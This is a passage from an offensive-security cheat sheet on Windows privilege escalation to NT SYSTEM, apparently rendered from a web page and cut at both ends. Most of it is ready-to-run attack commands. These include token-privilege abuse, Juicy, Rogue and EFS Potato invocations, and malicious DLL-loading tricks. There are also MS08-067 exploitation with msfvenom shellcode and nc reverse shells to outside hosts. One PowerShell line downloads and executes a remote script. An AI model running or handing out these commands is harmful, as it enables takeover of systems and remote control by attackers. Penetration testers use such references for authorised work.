</span></span></code></pre></div><h2 id=eop---from-local-administrator-to-nt-system>EoP - From local administrator to NT SYSTEM
<a class=anchor href=#eop---from-local-administrator-to-nt-system>#</a></h2><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>PsExec.exe -i -s cmd.exe
</span></span></code></pre></div><h2 id=eop---living-off-the-land-binaries-and-scripts>EoP - Living Off The Land Binaries and Scripts
<a class=anchor href=#eop---living-off-the-land-binaries-and-scripts>#</a></h2><p>Living Off The Land Binaries and Scripts (and also Libraries) : <a href=https://lolbas-project.github.io/>https://lolbas-project.github.io/</a></p><blockquote><p>The goal of the LOLBAS project is to document every binary, script, and library that can be used for Living Off The Land techniques.</p></blockquote><p>A LOLBin/Lib/Script must:</p><ul><li>Be a Microsoft-signed file, either native to the OS or downloaded from Microsoft.
Have extra &ldquo;unexpected&rdquo; functionality. It is not interesting to document intended use cases.
Exceptions are application whitelisting bypasses</li><li>Have functionality that would be useful to an APT or red team</li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>wmic.exe <span style=color:#66d9ef>process</span> call create calc
</span></span><span style=display:flex><span>regsvr32 /s /n /u /i:http<span style=color:#960050;background-color:#1e0010>:</span>//example.com/file.sct scrobj.dll
</span></span><span style=display:flex><span>Microsoft.Workflow.Compiler.exe tests.xml results.xml
</span></span></code></pre></div><h2 id=eop---impersonation-privileges>EoP - Impersonation Privileges
<a class=anchor href=#eop---impersonation-privileges>#</a></h2><p>Full privileges cheatsheet at <a href=https://github.com/gtworek/Priv2Admin>https://github.com/gtworek/Priv2Admin</a>, summary below will only list direct ways to exploit the privilege to obtain an admin session or read sensitive files.</p><table><thead><tr><th>Privilege</th><th>Impact</th><th>Tool</th><th>Execution path</th><th>Remarks</th></tr></thead><tbody><tr><td><code>SeAssignPrimaryToken</code></td><td><em><strong>Admin</strong></em></td><td>3rd party tool</td><td><em>&ldquo;It would allow a user to impersonate tokens and privesc to nt system using tools such as potato.exe, rottenpotato.exe and juicypotato.exe&rdquo;</em></td><td>Thank you <a href=https://twitter.com/Defte_>AurÃ©lien Chalot</a> for the update. I will try to re-phrase it to something more recipe-like soon.</td></tr><tr><td><code>SeBackup</code></td><td><strong>Threat</strong></td><td><em><strong>Built-in commands</strong></em></td><td>Read sensitve files with <code>robocopy /b</code></td><td>- May be more interesting if you can read %WINDIR%\MEMORY.DMP<br><br>- <code>SeBackupPrivilege</code> (and robocopy) is not helpful when it comes to open files.<br><br>- Robocopy requires both SeBackup and SeRestore to work with /b parameter.</td></tr><tr><td><code>SeCreateToken</code></td><td><em><strong>Admin</strong></em></td><td>3rd party tool</td><td>Create arbitrary token including local admin rights with <code>NtCreateToken</code>.</td><td></td></tr><tr><td><code>SeDebug</code></td><td><em><strong>Admin</strong></em></td><td><strong>PowerShell</strong></td><td>Duplicate the <code>lsass.exe</code> token.</td><td>Script to be found at <a href=https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Conjure-LSASS.ps1>FuzzySecurity</a></td></tr><tr><td><code>SeLoadDriver</code></td><td><em><strong>Admin</strong></em></td><td>3rd party tool</td><td>1. Load buggy kernel driver such as <code>szkg64.sys</code> or <code>capcom.sys</code><br>2. Exploit the driver vulnerability<br><br>Alternatively, the privilege may be used to unload security-related drivers with <code>ftlMC</code> builtin command. i.e.: <code>fltMC sysmondrv</code></td><td>1. The <code>szkg64</code> vulnerability is listed as <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-15732">CVE-2018-15732</a><br>2. The <code>szkg64</code> <a href="https://www.greyhathacker.net/?p=1025">exploit code</a> was created by <a href=https://twitter.com/parvezghh>Parvez Anwar</a></td></tr><tr><td><code>SeRestore</code></td><td><em><strong>Admin</strong></em></td><td><strong>PowerShell</strong></td><td>1. Launch PowerShell/ISE with the SeRestore privilege present.<br>2. Enable the privilege with <a href=https://github.com/gtworek/PSBits/blob/master/Misc/EnableSeRestorePrivilege.ps1>Enable-SeRestorePrivilege</a>).<br>3. Rename utilman.exe to utilman.old<br>4. Rename cmd.exe to utilman.exe<br>5. Lock the console and press Win+U</td><td>Attack may be detected by some AV software.<br><br>Alternative method relies on replacing service binaries stored in &ldquo;Program Files&rdquo; using the same privilege.</td></tr><tr><td><code>SeTakeOwnership</code></td><td><em><strong>Admin</strong></em></td><td><em><strong>Built-in commands</strong></em></td><td>1. <code>takeown.exe /f "%windir%\system32"</code><br>2. <code>icalcs.exe "%windir%\system32" /grant "%username%":F</code><br>3. Rename cmd.exe to utilman.exe<br>4. Lock the console and press Win+U</td><td>Attack may be detected by some AV software.<br><br>Alternative method relies on replacing service binaries stored in &ldquo;Program Files&rdquo; using the same privilege.</td></tr><tr><td><code>SeTcb</code></td><td><em><strong>Admin</strong></em></td><td>3rd party tool</td><td>Manipulate tokens to have local admin rights included. May require SeImpersonate.<br><br>To be verified.</td><td></td></tr></tbody></table><h3 id=restore-a-service-accounts-privileges>Restore A Service Account&rsquo;s Privileges
<a class=anchor href=#restore-a-service-accounts-privileges>#</a></h3><blockquote><p>This tool should be executed as LOCAL SERVICE or NETWORK SERVICE only.</p></blockquote><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span><span style=color:#75715e># https://github.com/itm4n/FullPowers</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>c:\TOOLS&gt;FullPowers
</span></span><span style=display:flex><span>[+] Started dummy thread with id <span style=color:#ae81ff>9976</span>
</span></span><span style=display:flex><span>[+] Successfully created scheduled task.
</span></span><span style=display:flex><span>[+] Got new token! Privilege count<span style=color:#960050;background-color:#1e0010>:</span> <span style=color:#ae81ff>7</span>
</span></span><span style=display:flex><span>[+] CreateProcessAsUser() OK
</span></span><span style=display:flex><span>Microsoft Windows [<span style=color:#66d9ef>Version 10.0.19041.84</span>]
</span></span><span style=display:flex><span>(c) <span style=color:#ae81ff>2019</span> Microsoft Corporation. All rights reserved.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>C:\WINDOWS\system32&gt;whoami /priv
</span></span><span style=display:flex><span>PRIVILEGES INFORMATION
</span></span><span style=display:flex><span>----------------------
</span></span><span style=display:flex><span>Privilege Name                Description                               State
</span></span><span style=display:flex><span>============================= ========================================= =======
</span></span><span style=display:flex><span>SeAssignPrimaryTokenPrivilege Replace a <span style=color:#66d9ef>process</span> level token             Enabled
</span></span><span style=display:flex><span>SeIncreaseQuotaPrivilege      Adjust memory quotas <span style=color:#66d9ef>for</span> a <span style=color:#66d9ef>process</span>        Enabled
</span></span><span style=display:flex><span>SeAuditPrivilege              Generate security audits                  Enabled
</span></span><span style=display:flex><span>SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
</span></span><span style=display:flex><span>SeImpersonatePrivilege        Impersonate a client after authentication Enabled
</span></span><span style=display:flex><span>SeCreateGlobalPrivilege       Create global objects                     Enabled
</span></span><span style=display:flex><span>SeIncreaseWorkingSetPrivilege Increase a <span style=color:#66d9ef>process</span> working set            Enabled
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>c:\TOOLS&gt;FullPowers -c <span style=color:#e6db74>&#34;C:\TOOLS\nc64.exe 1.2.3.4 1337 -e cmd&#34;</span> -z
</span></span></code></pre></div><h3 id=meterpreter-getsystem-and-alternatives>Meterpreter getsystem and alternatives
<a class=anchor href=#meterpreter-getsystem-and-alternatives>#</a></h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>meterpreter&gt; getsystem 
</span></span><span style=display:flex><span>Tokenvator.exe getsystem cmd.exe 
</span></span><span style=display:flex><span>incognito.exe execute -c <span style=color:#e6db74>&#34;NT AUTHORITY\SYSTEM&#34;</span> cmd.exe 
</span></span><span style=display:flex><span>psexec -s -i cmd.exe 
</span></span><span style=display:flex><span>python getsystem.py <span style=color:#75715e># from https://github.com/sailay1996/tokenx_privEsc</span>
</span></span></code></pre></div><h3 id=rottenpotato-token-impersonation>RottenPotato (Token Impersonation)
<a class=anchor href=#rottenpotato-token-impersonation>#</a></h3><ul><li>Binary available at : <a href=https://github.com/foxglovesec/RottenPotato>https://github.com/foxglovesec/RottenPotato</a></li><li>Binary available at : <a href=https://github.com/breenmachine/RottenPotatoNG>https://github.com/breenmachine/RottenPotatoNG</a></li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span>getuid
</span></span><span style=display:flex><span>getprivs
</span></span><span style=display:flex><span>use incognito
</span></span><span style=display:flex><span>list<span style=color:#960050;background-color:#1e0010>\</span>_tokens <span style=color:#f92672>-</span>u
</span></span><span style=display:flex><span>cd c:<span style=color:#960050;background-color:#1e0010>\</span>temp\
</span></span><span style=display:flex><span>execute <span style=color:#f92672>-</span>Hc <span style=color:#f92672>-</span>f .<span style=color:#f92672>/</span>rot.exe
</span></span><span style=display:flex><span>impersonate<span style=color:#960050;background-color:#1e0010>\</span>_token <span style=color:#e6db74>&#34;NT AUTHORITY\SYSTEM&#34;</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>Invoke-TokenManipulation -ImpersonateUser -Username <span style=color:#e6db74>&#34;lab\domainadminuser&#34;</span>
</span></span><span style=display:flex><span>Invoke-TokenManipulation -ImpersonateUser -Username <span style=color:#e6db74>&#34;NT AUTHORITY\SYSTEM&#34;</span>
</span></span><span style=display:flex><span>Get-Process wininit | Invoke-TokenManipulation -CreateProcess <span style=color:#e6db74>&#34;Powershell.exe -nop -exec bypass -c \&#34;</span>IEX (New-Object Net.WebClient).DownloadString(<span style=color:#e6db74>&#39;http://10.7.253.6:82/Invoke-PowerShellTcp.ps1&#39;</span>);\<span style=color:#e6db74>&#34;};&#34;</span>
</span></span></code></pre></div><h3 id=juicy-potato-abusing-the-golden-privileges>Juicy Potato (Abusing the golden privileges)
<a class=anchor href=#juicy-potato-abusing-the-golden-privileges>#</a></h3><blockquote><p>If the machine is <strong>>= Windows 10 1809 & Windows Server 2019</strong> - Try <strong>Rogue Potato</strong><br>If the machine is <strong>&lt; Windows 10 1809 &lt; Windows Server 2019</strong> - Try <strong>Juicy Potato</strong></p></blockquote><ul><li>Binary available at : <a href=https://github.com/ohpe/juicy-potato/releases>https://github.com/ohpe/juicy-potato/releases</a></li></ul><ol><li><p>Check the privileges of the service account, you should look for <strong>SeImpersonate</strong> and/or <strong>SeAssignPrimaryToken</strong> (Impersonate a client after authentication)</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>whoami /priv
</span></span></code></pre></div></li><li><p>Select a CLSID based on your Windows version, a CLSID is a globally unique identifier that identifies a COM class object</p><ul><li><a href=https://ohpe.it/juicy-potato/CLSID/Windows_7_Enterprise>Windows 7 Enterprise</a></li><li><a href=https://ohpe.it/juicy-potato/CLSID/Windows_8.1_Enterprise>Windows 8.1 Enterprise</a></li><li><a href=https://ohpe.it/juicy-potato/CLSID/Windows_10_Enterprise>Windows 10 Enterprise</a></li><li><a href=https://ohpe.it/juicy-potato/CLSID/Windows_10_Pro>Windows 10 Professional</a></li><li><a href=https://ohpe.it/juicy-potato/CLSID/Windows_Server_2008_R2_Enterprise>Windows Server 2008 R2 Enterprise</a></li><li><a href=https://ohpe.it/juicy-potato/CLSID/Windows_Server_2012_Datacenter>Windows Server 2012 Datacenter</a></li><li><a href=https://ohpe.it/juicy-potato/CLSID/Windows_Server_2016_Standard>Windows Server 2016 Standard</a></li></ul></li><li><p>Execute JuicyPotato to run a privileged command.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>JuicyPotato.exe -l <span style=color:#ae81ff>9999</span> -p c:\interpub\wwwroot\upload\nc.exe -a <span style=color:#e6db74>&#34;IP PORT -e cmd.exe&#34;</span> -t t -c {B91D5831-B1BD-<span style=color:#ae81ff>4608</span>-<span style=color:#ae81ff>8198</span>-D72E155020F7}
</span></span><span style=display:flex><span>JuicyPotato.exe -l <span style=color:#ae81ff>1340</span> -p C:\users\User\rev.bat -t * -c {e60687f7-01a1-40aa-86ac-db1cbf673334}
</span></span><span style=display:flex><span>JuicyPotato.exe -l <span style=color:#ae81ff>1337</span> -p c:\Windows\System32\cmd.exe -t * -c {F7FD3FD6-<span style=color:#ae81ff>9994</span>-<span style=color:#ae81ff>452D</span>-8DA7-9A8FD87AEEF4} -a <span style=color:#e6db74>&#34;/c c:\users\User\reverse_shell.exe&#34;</span>
</span></span><span style=display:flex><span>    Testing {F7FD3FD6-<span style=color:#ae81ff>9994</span>-<span style=color:#ae81ff>452D</span>-8DA7-9A8FD87AEEF4} <span style=color:#ae81ff>1337</span>
</span></span><span style=display:flex><span>    ......
</span></span><span style=display:flex><span>    [+] authresult <span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>    {F7FD3FD6-<span style=color:#ae81ff>9994</span>-<span style=color:#ae81ff>452D</span>-8DA7-9A8FD87AEEF4};NT AUTHORITY\SYSTEM
</span></span><span style=display:flex><span>    [+] CreateProcessWithTokenW OK
</span></span></code></pre></div></li></ol><h3 id=rogue-potato-fake-oxid-resolver>Rogue Potato (Fake OXID Resolver)
<a class=anchor href=#rogue-potato-fake-oxid-resolver>#</a></h3><ul><li>Binary available at <a href=https://github.com/antonioCoco/RoguePotato>https://github.com/antonioCoco/RoguePotato</a></li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span><span style=color:#75715e># Network redirector / port forwarder to run on your remote machine, must use port 135 as src port</span>
</span></span><span style=display:flex><span>socat tcp-listen<span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>135</span>,reuseaddr,fork tcp<span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>10.0</span>.0.<span style=color:#ae81ff>3</span><span style=color:#960050;background-color:#1e0010>:</span><span style=color:#ae81ff>9999</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># RoguePotato without running RogueOxidResolver locally. You should run the RogueOxidResolver.exe on your remote machine. </span>
</span></span><span style=display:flex><span><span style=color:#75715e># Use this if you have fw restrictions.</span>
</span></span><span style=display:flex><span>RoguePotato.exe -r <span style=color:#ae81ff>10.0</span>.0.3 -e <span style=color:#e6db74>&#34;C:\windows\system32\cmd.exe&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># RoguePotato all in one with RogueOxidResolver running locally on port 9999</span>
</span></span><span style=display:flex><span>RoguePotato.exe -r <span style=color:#ae81ff>10.0</span>.0.3 -e <span style=color:#e6db74>&#34;C:\windows\system32\cmd.exe&#34;</span> -l <span style=color:#ae81ff>9999</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>#RoguePotato all in one with RogueOxidResolver running locally on port 9999 and specific clsid and custom pipename</span>
</span></span><span style=display:flex><span>RoguePotato.exe -r <span style=color:#ae81ff>10.0</span>.0.3 -e <span style=color:#e6db74>&#34;C:\windows\system32\cmd.exe&#34;</span> -l <span style=color:#ae81ff>9999</span> -c <span style=color:#e6db74>&#34;{6d8ff8e1-730d-11d4-bf42-00b0d0118b56}&#34;</span> -p splintercode
</span></span></code></pre></div><h3 id=efspotato-ms-efsr-efsrpcopenfileraw>EFSPotato (MS-EFSR EfsRpcOpenFileRaw)
<a class=anchor href=#efspotato-ms-efsr-efsrpcopenfileraw>#</a></h3><ul><li>Binary available at <a href=https://github.com/zcgonvh/EfsPotato>https://github.com/zcgonvh/EfsPotato</a></li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span><span style=color:#75715e># .NET 4.x</span>
</span></span><span style=display:flex><span>csc EfsPotato.cs
</span></span><span style=display:flex><span>csc /platform<span style=color:#960050;background-color:#1e0010>:</span>x86 EfsPotato.cs
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># .NET 2.0/3.5</span>
</span></span><span style=display:flex><span>C:\Windows\Microsoft.Net\Framework\V3.<span style=color:#ae81ff>5</span>\csc.exe EfsPotato.cs
</span></span><span style=display:flex><span>C:\Windows\Microsoft.Net\Framework\V3.<span style=color:#ae81ff>5</span>\csc.exe /platform<span style=color:#960050;background-color:#1e0010>:</span>x86 EfsPotato.cs
</span></span></code></pre></div><h3 id=juicypotatong>JuicyPotatoNG
<a class=anchor href=#juicypotatong>#</a></h3><ul><li><a href=https://github.com/antonioCoco/JuicyPotatoNG>antonioCoco/JuicyPotatoNG</a></li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>JuicyPotatoNG.exe -t * -p <span style=color:#e6db74>&#34;C:\Windows\System32\cmd.exe&#34;</span> -a <span style=color:#e6db74>&#34;/c whoami&#34;</span> &gt; C:\juicypotatong.txt
</span></span></code></pre></div><h2 id=eop---privileged-file-write>EoP - Privileged File Write
<a class=anchor href=#eop---privileged-file-write>#</a></h2><h3 id=diaghub>DiagHub
<a class=anchor href=#diaghub>#</a></h3><p>:warning: Starting with version 1903 and above, DiagHub can no longer be used to load arbitrary DLLs.</p><p>The Microsoft Diagnostics Hub Standard Collector Service (DiagHub) is a service that collects trace information and is programmatically exposed via DCOM.
This DCOM object can be used to load a DLL into a SYSTEM process, provided that this DLL exists in the <code>C:\Windows\System32</code> directory.</p><h4 id=exploit>Exploit
<a class=anchor href=#exploit>#</a></h4><ol><li>Create an <a href=https://gist.github.com/xct/3949f3f4f178b1f3427fae7686a2a9c0>evil DLL</a> e.g: payload.dll and move it into <code>C:\Windows\System32</code></li><li>Build <a href=https://github.com/xct/diaghub>https://github.com/xct/diaghub</a></li><li><code>diaghub.exe c:\\ProgramData\\ payload.dll</code></li></ol><p>The default payload will run <code>C:\Windows\System32\spool\drivers\color\nc.exe -lvp 2000 -e cmd.exe</code></p><p>Alternative tools:</p><ul><li><a href=https://github.com/Accenture/AARO-Bugs/tree/master/CVE-2020-5825/TrigDiag>https://github.com/Accenture/AARO-Bugs/tree/master/CVE-2020-5825/TrigDiag</a></li><li><a href=https://github.com/decoder-it/diaghub_exploit>https://github.com/decoder-it/diaghub_exploit</a></li></ul><h3 id=usodllloader>UsoDLLLoader
<a class=anchor href=#usodllloader>#</a></h3><p>:warning: 2020-06-06 Update: this trick no longer works on the latest builds of Windows 10 Insider Preview.</p><blockquote><p>An alternative to the DiagHub DLL loading &ldquo;exploit&rdquo; found by James Forshaw (a.k.a. @tiraniddo)</p></blockquote><p>If we found a privileged file write vulnerability in Windows or in some third-party software, we could copy our own version of <code>windowscoredeviceinfo.dll</code> into <code>C:\Windows\Sytem32\</code> and then have it loaded by the USO service to get arbitrary code execution as <strong>NT AUTHORITY\System</strong>.</p><h4 id=exploit-1>Exploit
<a class=anchor href=#exploit-1>#</a></h4><ol><li>Build <a href=https://github.com/itm4n/UsoDllLoader>https://github.com/itm4n/UsoDllLoader</a><ul><li>Select Release config and x64 architecure.</li><li>Build solution.<ul><li>DLL .\x64\Release\WindowsCoreDeviceInfo.dll</li><li>Loader .\x64\Release\UsoDllLoader.exe.</li></ul></li></ul></li><li>Copy <code>WindowsCoreDeviceInfo.dll</code> to <code>C:\Windows\System32\</code></li><li>Use the loader and wait for the shell or run <code>usoclient StartInteractiveScan</code> and connect to the bind shell on port 1337.</li></ol><h3 id=wertrigger>WerTrigger
<a class=anchor href=#wertrigger>#</a></h3><blockquote><p>Weaponizing for privileged file writes bugs with Windows problem reporting</p></blockquote><ol><li>Clone <a href=https://github.com/sailay1996/WerTrigger>https://github.com/sailay1996/WerTrigger</a></li><li>Copy <code>phoneinfo.dll</code> to <code>C:\Windows\System32\</code></li><li>Place <code>Report.wer</code> file and <code>WerTrigger.exe</code> in a same directory.</li><li>Then, run <code>WerTrigger.exe</code>.</li><li>Enjoy a shell as <strong>NT AUTHORITY\SYSTEM</strong></li></ol><h2 id=eop---common-vulnerabilities-and-exposure>EoP - Common Vulnerabilities and Exposure
<a class=anchor href=#eop---common-vulnerabilities-and-exposure>#</a></h2><h3 id=ms08-067-netapi>MS08-067 (NetAPI)
<a class=anchor href=#ms08-067-netapi>#</a></h3><p>Check the vulnerability with the following nmap script.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span>nmap <span style=color:#f92672>-</span>Pn <span style=color:#f92672>-</span>p445<span style=color:#960050;background-color:#1e0010>â€Š</span><span style=color:#f92672>--</span>open<span style=color:#960050;background-color:#1e0010>â€Š</span><span style=color:#f92672>--</span>max<span style=color:#f92672>-</span>hostgroup <span style=color:#ae81ff>3</span><span style=color:#960050;background-color:#1e0010>â€Š</span><span style=color:#f92672>--</span>script smb<span style=color:#f92672>-</span>vuln<span style=color:#f92672>-</span>ms08<span style=color:#f92672>-</span><span style=color:#ae81ff>067</span> <span style=color:#f92672>&lt;</span>ip_netblock<span style=color:#f92672>&gt;</span>
</span></span></code></pre></div><p>Metasploit modules to exploit <code>MS08-067 NetAPI</code>.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>exploit/windows/smb/ms08_067_netapi
</span></span></code></pre></div><p>If you can&rsquo;t use Metasploit and only want a reverse shell.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>https<span style=color:#960050;background-color:#1e0010>:</span>//raw.githubusercontent.com/jivoi/pentest/master/exploit_win/ms08-<span style=color:#ae81ff>067</span>.py
</span></span><span style=display:flex><span>msfvenom -p windows/shell_reverse_tcp LHOST=<span style=color:#ae81ff>10.10</span>.10.10 LPORT=<span style=color:#ae81ff>443</span> EXITFUNC=thread -b <span style=color:#e6db74>&#34;\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40&#34;</span> <span style=color:#f92672>-f</span> py -v shellcode -a x86 --platform windows
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Example<span style=color:#960050;background-color:#1e0010>:</span> MS08_067_2018.py <span style=color:#ae81ff>192.168</span>.1.1 <span style=color:#ae81ff>1</span> <span style=color:#ae81ff>445</span> -- <span style=color:#66d9ef>for</span> Windows XP SP0/SP1 Universal, port <span style=color:#ae81ff>445</span>
</span></span><span style=display:flex><span>Example<span style=color:#960050;background-color:#1e0010>:</span> MS08_067_2018.py <span style=color:#ae81ff>192.168</span>.1.1 <span style=color:#ae81ff>2</span> <span style=color:#ae81ff>139</span> -- <span style=color:#66d9ef>for</span> Windows <span style=color:#ae81ff>2000</span> Universal, port <span style=color:#ae81ff>139</span> (<span style=color:#ae81ff>445</span> could also be used)
</span></span><span style=display:flex><span>Example<span style=color:#960050;background-color:#1e0010>:</span> MS08_067_2018.py <span style=color:#ae81ff>192.168</span>.1.1 <span style=color:#ae81ff>3</span> <span style=color:#ae81ff>445</span> -- <span style=color:#66d9ef>for</span> Windows <span style=color:#ae81ff>2003</span> SP0 Universal
</span></span><span style=display:flex><span>Example<span style=color:#960050;background-color:#1e0010>:</span> MS08_067_2018.py <span style=color:#ae81ff>192.168</span>.1.1 <span style=color:#ae81ff>4</span> <span style=color:#ae81ff>445</span> -- <span style=color:#66d9ef>for</span> Windows <span style=color:#ae81ff>2003</span> SP1 English
</span></span><span style=display:flex><span>Example<span style=color:#960050;background-color:#1e0010>:</span> MS08_067_2018.py <span style=color:#ae81ff>192.168</span>.1.1 <span style=color:#ae81ff>5</span> <span style=color:#ae81ff>445</span> -- <span style=color:#66d9ef>for</span> Windows XP SP3 French (NX)
</span></span><span style=display:flex><span>Example<span style=color:#960050;background-color:#1e0010>:</span> MS08_067_2018.py <span style=color:#ae81ff>192.168</span>.1.1 <span style=color:#ae81ff>6</span> <span style=color:#ae81ff>445</span> -- <span style=color:#66d9ef>for</span> Windows XP SP3 English (NX)
</span></span><span style=display:flex><span>Example<span style=color:#960050;background-color:#1e0010>:</span> MS08_067_2018.py <span style=color:#ae81ff>192.168</span>.1.1 <span style=color:#ae81ff>7</span> <span style=color:#ae81ff>445</span> -- <span style=color:#66d9ef>for</span> Windows XP SP3 English (AlwaysOn NX)
</span></span><span style=display:flex><span>python ms08-<span style=color:#ae81ff>067</span>.py <span style=color:#ae81ff>10.0</span>.0.1 <span style=color:#ae81ff>6</span> <span style=color:#ae81ff>445</span>
</span></span></code></pre></div><h3 id=ms10-015-kitrap0d---microsoft-windows-nt200020032008xpvista7>MS10-015 (KiTrap0D) - Microsoft Windows NT/2000/2003/2008/XP/Vista/7
<a class=anchor href=#ms10-015-kitrap0d---microsoft-windows-nt200020032008xpvista7>#</a></h3><p>&lsquo;KiTrap0D&rsquo; User Mode to Ring Escalation (MS10-015)</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>https<span style=color:#960050;background-color:#1e0010>:</span>//www.exploit-db.com/exploits/<span style=color:#ae81ff>11199</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Metasploit <span style=color:#960050;background-color:#1e0010>:</span> exploit/windows/local/ms10_015_kitrap0d
</span></span></code></pre></div><h3 id=ms11-080-afdsys---microsoft-windows-xp2003>MS11-080 (afd.sys) - Microsoft Windows XP/2003
<a class=anchor href=#ms11-080-afdsys---microsoft-windows-xp2003>#</a></h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>Python<span style=color:#960050;background-color:#1e0010>:</span> https<span style=color:#960050;background-color:#1e0010>:</span>//www.exploit-db.com/exploits/<span style=color:#ae81ff>18176</span>
</span></span><span style=display:flex><span>Metasploit<span style=color:#960050;background-color:#1e0010>:</span> exploit/windows/local/ms11_080_afdjoinleaf
</span></span></code></pre></div><h3 id=ms15-051-client-copy-image---microsoft-windows-20032008782012>MS15-051 (Client Copy Image) - Microsoft Windows 2003/2008/7/8/2012
<a class=anchor href=#ms15-051-client-copy-image---microsoft-windows-20032008782012>#</a></h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>printf(<span style=color:#e6db74>&#34;[#] usage: ms15-051 command \n&#34;</span>);
</span></span><span style=display:flex><span>printf(<span style=color:#e6db74>&#34;[#] eg: ms15-051 \&#34;</span>whoami /all\<span style=color:#e6db74>&#34; \n&#34;</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># x32</span>
</span></span><span style=display:flex><span>https<span style=color:#960050;background-color:#1e0010>:</span>//github.com/rootphantomer/exp/raw/master/ms15-<span style=color:#ae81ff>051</span><span style=color:#66d9ef>%</span>EF<span style=color:#66d9ef>%</span>BC<span style=color:#66d9ef>%</span><span style=color:#ae81ff>88</span><span style=color:#66d9ef>%</span>E4<span style=color:#66d9ef>%</span>BF<span style=color:#66d9ef>%</span>AE<span style=color:#66d9ef>%</span>E6<span style=color:#66d9ef>%</span><span style=color:#ae81ff>94</span><span style=color:#66d9ef>%</span>B9<span style=color:#66d9ef>%</span>E7<span style=color:#66d9ef>%</span><span style=color:#ae81ff>89</span><span style=color:#66d9ef>%</span><span style=color:#ae81ff>88</span><span style=color:#66d9ef>%</span>EF<span style=color:#66d9ef>%</span>BC<span style=color:#66d9ef>%</span><span style=color:#ae81ff>89</span>/ms15-<span style=color:#ae81ff>051</span>/ms15-<span style=color:#ae81ff>051</span>/Win32/ms15-<span style=color:#ae81ff>051</span>.exe
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># x64</span>
